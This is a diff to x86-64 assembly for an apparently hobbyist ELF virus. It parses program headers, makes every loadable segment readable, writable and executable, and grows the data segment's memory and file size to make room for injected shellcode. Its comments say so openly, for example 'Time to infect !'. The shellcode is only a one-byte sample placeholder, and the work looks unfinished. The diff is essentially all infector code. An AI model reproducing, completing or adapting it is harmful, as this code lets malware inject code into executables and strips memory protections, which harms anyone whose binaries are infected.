@@ -480,14 +480,18 @@ parse64elfheader:
 	pop rsi
 	pop rdi
 retn
+%define SHELLCODE_LEN 1
 
 parse64elfphdr:
 	push rdi
 	push rsi
 	push rdx
 
+	sub rsp, 8; p_memsz
+	sub rsp, 4;p_flags
 	sub rsp, 2; e_phnum
 
+	xor rax, rax
 	mov bx,  WORD[rdi + 56]
 	mov WORD[rsp], bx; e_phnum stored
 	mov rbx, QWORD[rdi + 32]
@@ -502,10 +506,103 @@ parse64elfphdr:
 		cmp cx, WORD[rsp]
 		jge loop_p64ephdr_exit
 		lea r9, [rsi+rdx]; current phdr
-;		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
-;		jne print_p64ephdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne print_p64ephdr
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rsi, r9
+		mov rdx, 4
+		mov rax, 1
+		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
+		mov rdx, 4; sizeof(uint32_t)
+		mov rax, 1
+		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		je p64ephdr_data_seg
+		;we just write the rest of the phdr if we get here
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [r9 + 8]
+		mov rdx, 48; 56-8
+		mov rax, 1
+		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		jmp continue_p64ephdr		
+		p64ephdr_data_seg:
+		;we found the data segment ! bss ect... Time to infect !
+		;write till p_filesz
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [r9 + 8]
+		mov rdx, 24; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
+		mov rax, 1
+		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		mov rax, QWORD[r9 + 40]
+		mov QWORD[rsp + 6], rax; store p_memsz
+		add QWORD[rsp + 6], SHELLCODE_LEN; ADD SHELLCODE LEN (1 as sample)
+		;write custom memsz, filesz
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		lea rsi, [rsp + 38]; 32 from push + 6 rsp
+		mov rdx, 8
+		mov rax, 1
+		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
+		mov rax, 1
+		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax
+		;write remaining p_align
+		push rax
+		push rcx
+		push rsi
+		push rdx
+		mov rdx, 8
+		lea rsi, [r9 + 48]
+		mov rax, 1
+		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
+		pop rdx
+		pop rsi
+		pop rcx
+		pop rax	
+		sub QWORD[rsp + 6], SHELLCODE_LEN; restore memsz for pad calc
+		;set pad value
+		mov rax, QWORD[rsp + 6]; p_memsz
+		sub rax, [r9 + 32]; ret = p_memsz - p_filesz
 
+		jmp continue_p64ephdr
 		print_p64ephdr: ; case where we don't modify the phdr at all 
+			push rax
 			push rcx
 			push rsi
 			push rdx
@@ -513,18 +610,19 @@ parse64elfphdr:
 			mov rsi, r9
 			mov rdx, 56; sizeof(Elf64_Phdr)
 			mov rax, 1
-			syscall
+			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
 			pop rdx
 			pop rsi
 			pop rcx
-
+			pop rax
 		continue_p64ephdr:
 		inc rcx
 		add rdx, 56; rdx += sizeof(Elf64_Phdr)
 		jmp loop_p64ephdr
 	loop_p64ephdr_exit: 
 	add rsp, 2
-
+	add rsp, 4
+	add rsp, 8
 	pop rdx
 	pop rsi
 	pop rdi
